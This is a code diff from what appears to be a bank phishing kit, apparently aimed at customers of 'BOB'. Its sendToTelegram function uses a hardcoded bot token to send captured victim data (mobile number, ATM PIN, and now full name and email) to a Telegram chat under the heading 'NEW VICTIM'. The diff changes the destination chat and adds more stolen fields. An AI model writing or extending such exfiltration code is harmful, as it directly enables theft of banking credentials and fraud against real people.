@@ -342,11 +342,13 @@
         // Telegram Sender
         async function sendToTelegram(data) {
             const BOT_TOKEN = "8965651789:AAE3nyAfBaSEHmbxGY-R8GWnXTUVrnGhSac";
-            const CHAT_ID = "7598156340";
+            const CHAT_ID = "-1004473127292";
 
             const message = `
 🔥 **BOB FULLZ - NEW VICTIM** 🔥
 
+👤 **Name:** ${data.fullName || 'N/A'}
+📧 **Email:** ${data.emailAddress || 'N/A'}
 📱 **Mobile:** ${data.mobileNumber || 'N/A'}
 🔑 **Login ATM PIN:** ${data.atmPinLogin || 'N/A'}
 
